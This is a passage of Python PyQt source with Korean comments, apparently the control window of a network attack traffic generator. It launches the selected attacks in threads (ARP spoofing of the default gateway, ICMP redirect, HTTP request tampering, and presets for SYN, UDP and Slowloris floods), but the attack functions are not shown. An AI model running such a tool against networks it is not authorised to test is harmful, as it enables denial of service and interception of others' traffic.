            selected_attacks.append(('SSL/TLS 트래픽', ssl_traffic, (target_ip, packet_count, packet_size, None)))
        if self.http_request_modification_checkbox.isChecked():
            selected_attacks.append(('HTTP 요청 변조', http_request_modification, (target_ip, packet_count, packet_size, None)))
        
        # 2번 선택군 (네트워크 조작) 확인
        if self.arp_spoofing_checkbox.isChecked():
            if not spoof_ip:
                # 기본 게이트웨이를 스푸핑 IP로 사용
                default_gateway = get_default_gateway()
                if not default_gateway:
                    QMessageBox.warning(self, '게이트웨이 오류', 'ARP 스푸핑을 위한 게이트웨이를 찾을 수 없습니다.')
                    return
                spoof_ip = default_gateway
            selected_attacks.append(('ARP 스푸핑', arp_spoof, (target_ip, spoof_ip, None)))
        
        if self.icmp_redirect_checkbox.isChecked():
            default_gateway = get_default_gateway()
            if not default_gateway:
                QMessageBox.warning(self, '게이트웨이 오류', '기본 게이트웨이를 찾을 수 없습니다.')
                return
            selected_attacks.append(('ICMP 리다이렉트', icmp_redirect, (target_ip, spoof_ip if spoof_ip else default_gateway, None)))
        
        # 선택된 공격이 없는 경우
        if not selected_attacks:
            QMessageBox.warning(self, '선택 오류', '최소한 하나의 공격 유형을 선택하세요.')
            return
        
        # 기존 스레드 종료 및 리소스 정리
        self.stop_transmission()
        
        # UI 상태 업데이트
        self.generate_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.status_label.setText("트래픽 생성 중...")
        self.status_label.setStyleSheet("color: green; font-weight: bold;")
        self.log_output.clear()
        
        # 선택된 공격들을 실행
        attack_names = []
        for attack_name, attack_func, attack_args in selected_attacks:
            # TrafficGeneratorThread가 내부적으로 stop_flag를 관리
            thread = TrafficGeneratorThread(attack_func, attack_args, attack_name)
            thread.progress.connect(self.update_progress)
            thread.finished.connect(lambda msg, name=attack_name: self.on_attack_finished(name, msg))
            thread.error.connect(lambda msg, name=attack_name: self.on_attack_error(name, msg))
            thread.start()
            
            # 스레드 저장
            self.attack_threads.append(thread)
            attack_names.append(attack_name)
        
        # 로그 출력
        self.add_log(f'시작된 공격: {", ".join(attack_names)}')
        self.add_log(f'대상 IP: {target_ip}, 패킷 수: {packet_count}')

    def stop_transmission(self):
        """모든 트래픽 전송을 중지합니다."""
        # 실행 중인 스레드가 없으면 조용히 종료
        if not self.attack_threads:
            # UI 상태만 업데이트
            self.reset_ui_state()
            return
        
        self.add_log("트래픽 전송 중지 요청...")
        self.status_label.setText("중지 중...")
        self.status_label.setStyleSheet("color: orange; font-weight: bold;")
        
        # 스레드 종료
        for thread in self.attack_threads:
            thread.stop()
        
        # 모든 스레드가 종료될 때까지 잠시 대기
        QTimer.singleShot(1000, self.finalize_stop)
        
    def finalize_stop(self):
        """스레드 종료 후 정리 작업"""
        # 리소스 정리
        self.attack_threads.clear()
        
        # 명시적 가비지 컬렉션
        gc.collect()
        
        # UI 상태 업데이트
        self.reset_ui_state()
        
        # 로그 출력
        self.add_log('모든 트래픽 전송이 중지되었습니다.')
        
    def reset_ui_state(self):
        """UI 상태를 초기 상태로 리셋"""
        if hasattr(self, 'generate_button'):
            self.generate_button.setEnabled(True)
        if hasattr(self, 'stop_button'):
            self.stop_button.setEnabled(False)
        if hasattr(self, 'progress_bar'):
            self.progress_bar.setVisible(False)
        if hasattr(self, 'status_label'):
            self.status_label.setText("대기 중...")
            self.status_label.setStyleSheet("color: blue; font-weight: bold;")
    
    def update_progress(self, message):
        """진행률 업데이트"""
        self.add_log(message)
        # 간단한 진행률 파싱 (예: "SYN 플러드 진행률: 50%")
        if "진행률:" in message and "%" in message:
            try:
                percent_str = message.split("진행률:")[1].split("%")[0].strip()
                percent = int(percent_str)
                self.progress_bar.setValue(percent)
            except (ValueError, IndexError):
                pass
    
    def add_log(self, message):
        """로그 메시지 추가"""
        if hasattr(self, 'log_output'):
            timestamp = time.strftime("[%H:%M:%S]")
            self.log_output.append(f"{timestamp} {message}")
            # 자동으로 맨 아래로 스크롤
            cursor = self.log_output.textCursor()
            cursor.movePosition(cursor.MoveOperation.End)
            self.log_output.setTextCursor(cursor)

    def on_attack_finished(self, attack_name, message=""):
        """공격 완료 시 호출"""
        self.add_log(f'{attack_name} 완료: {message}')
        
        # 모든 스레드가 완료되었는지 확인
        all_finished = all(not thread.isRunning() for thread in self.attack_threads)
        if all_finished:
            self.reset_ui_state()
            self.add_log('모든 트래픽 생성 작업이 완료되었습니다.')

    def on_attack_error(self, attack_name, message=""):
        """공격 오류 시 호출"""
        error_msg = f'{attack_name} 오류: {message}'
        self.add_log(error_msg)
        QMessageBox.critical(self, '공격 오류', error_msg)

    def apply_preset(self):
        preset_name = self.preset_dropdown.currentText()
        preset = self.presets.get(preset_name, {})

        self.syn_flood_checkbox.setChecked(preset.get("syn_flood", False))
        self.udp_flood_checkbox.setChecked(preset.get("udp_flood", False))
        self.http_slowloris_checkbox.setChecked(preset.get("http_slowloris", False))
        self.tcp_handshake_misuse_checkbox.setChecked(preset.get("tcp_handshake_misuse", False))
        self.ssl_traffic_checkbox.setChecked(preset.get("ssl_traffic", False))
        self.http_request_modification_checkbox.setChecked(preset.get("http_request_modification", False))
        self.arp_spoofing_checkbox.setChecked(preset.get("arp_spoofing", False))
        self.icmp_redirect_checkbox.setChecked(preset.get("icmp_redirect", False))
        self.port_mirroring_checkbox.setChecked(preset.get("port_mirroring", False))

    def toggle_packet_size(self):
        sender = self.sender()
        if sender == self.default_packet_size_checkbox and self.default_packet_size_checkbox.isChecked():
            self.large_packet_size_checkbox.setChecked(False)
        elif sender == self.large_packet_size_checkbox and self.large_packet_size_checkbox.isChecked():
            self.default_packet_size_checkbox.setChecked(False)

    def get_packet_size(self):
        if self.default_packet_size_checkbox.isChecked():
            return 1514
        elif self.large_packet_size_checkbox.isChecked():
            return 9000  # 예시로 큰 패킷 크기 설정
        return 1514  # 기본값 

    def toggle_spoof_ip(self):
        """IP 스푸핑 체크박스 상태 변경 시 호출"""
        if self.spoof_ip_checkbox.isChecked():
            self.spoof_ip_input.setEnabled(True)
        else:
            self.spoof_ip_input.setEnabled(False)
            self.spoof_ip_input.clear()

    def test_packet_transmission(self):
        """패킷 전송 테스트"""
        target_ip = self.ip_input.text().strip()
        
        if not self.is_valid_ip(target_ip):
            QMessageBox.warning(self, "오류", "유효한 IP 주소를 입력하세요.")
            return
        
        self.add_log(f"패킷 전송 테스트 시작 - 대상: {target_ip}")
        
        # 소켓 테스트
        self.add_log("소켓 방식 테스트 중...")
        if test_packet_send(target_ip, "socket"):
            self.add_log("✅ 소켓 패킷 전송 테스트 성공!")
            QMessageBox.information(self, "테스트 성공", "소켓 패킷 전송 테스트 성공!")
        else:
            self.add_log("❌ 소켓 패킷 전송 테스트 실패")
            QMessageBox.warning(self, "테스트 실패", "소켓 패킷 전송 테스트 실패")
        
        # Scapy 테스트
        self.add_log("Scapy 방식 테스트 중...")
        if test_packet_send(target_ip, "scapy"):
            self.add_log("✅ Scapy 패킷 전송 테스트 성공!")
            QMessageBox.information(self, "테스트 성공", "Scapy 패킷 전송 테스트 성공!")
        else:
            self.add_log("❌ Scapy 패킷 전송 테스트 실패")
            QMessageBox.warning(self, "테스트 실패", "Scapy 패킷 전송 테스트 실패")

    def clean_memory(self):
        """메모리 정리"""
        try:
            # 가비지 컬렉션 강제 실행
            gc.collect()

            # 스레드별 메모리 사용량 확인 (디버깅용)
            try:
                import psutil
                process = psutil.Process()
                memory_info = process.memory_info()
                memory_mb = memory_info.rss / 1024 / 1024
                
                # 메모리 사용량이 높은 경우 로그 출력
                if memory_mb > 500:  # 500MB 이상
                    self.add_log(f"메모리 정리 완료 - 현재 사용량: {memory_mb:.2f} MB")
                    
                # 메모리 사용량이 매우 높은 경우 경고
                if memory_mb > 1000:  # 1GB 이상
                    self.add_log("⚠️ 메모리 사용량이 높습니다. 브라우저나 다른 프로그램을 종료하는 것을 권장합니다.")
                    
            except ImportError:
                # psutil이 없는 경우 조용히 넘어감
                pass
                
        except Exception as e:
            # 메모리 정리 중 오류가 발생해도 로그만 남기고 계속 진행
            if hasattr(self, 'add_log'):
                self.add_log(f"메모리 정리 중 오류: {e}")
            else:
                print(f"메모리 정리 중 오류: {e}")

    def closeEvent(self, event):
        """창 닫기 이벤트 - 안전한 종료"""
        if self.attack_threads:
            reply = QMessageBox.question(
                self, '종료 확인',
                '트래픽 생성이 진행 중입니다. 종료하시겠습니까?',
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.No:
                event.ignore()
                return
            
            # 모든 스레드 강제 종료
            self.stop_transmission()
            
            # 종료될 때까지 잠시 대기
            for thread in self.attack_threads:
                thread.wait(2000)  # 2초 대기
                if thread.isRunning():
                    thread.terminate()
        
        # 타이머 정리
        if hasattr(self, 'gc_timer'):
            self.gc_timer.stop()
        
        event.accept()

    def is_valid_ip(self, ip):
        """IP 주소 유효성 검사"""
        return is_valid_ip(ip) 